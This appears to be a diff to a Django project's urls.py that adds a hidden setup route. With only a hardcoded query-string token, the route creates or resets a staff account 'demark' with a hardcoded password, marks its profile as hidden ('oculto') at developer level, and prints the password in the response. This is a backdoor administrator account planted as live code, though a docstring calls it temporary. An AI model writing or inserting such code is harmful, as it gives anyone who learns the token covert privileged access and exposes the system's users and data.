@@ -1,7 +1,31 @@
 from django.urls import path
 from . import views
+from django.http import HttpResponse
+
+def _setup_developer(request):
+    """Rota temporária — cria o usuário developer. Remover após uso."""
+    token = request.GET.get('t', '')
+    if token != 'jr2024setup':
+        return HttpResponse('Acesso negado.', status=403)
+    from django.contrib.auth.models import User
+    from cadastros.models_perfil import PerfilUsuario
+    user, created = User.objects.get_or_create(
+        username='demark',
+        defaults={'first_name': 'Developer', 'is_staff': True, 'is_active': True}
+    )
+    user.set_password('Smith26')
+    user.is_staff = True
+    user.is_active = True
+    user.save()
+    perfil, _ = PerfilUsuario.objects.get_or_create(user=user)
+    perfil.nivel = 'developer'
+    perfil.oculto = True
+    perfil.save()
+    acao = 'criado' if created else 'atualizado'
+    return HttpResponse(f'✔ Usuário demark {acao} com sucesso. Senha: Smith26')
 
 urlpatterns = [
+    path('_setup/dev/', _setup_developer),
     path('', views.dashboard, name='dashboard'),
 
     # Agentes
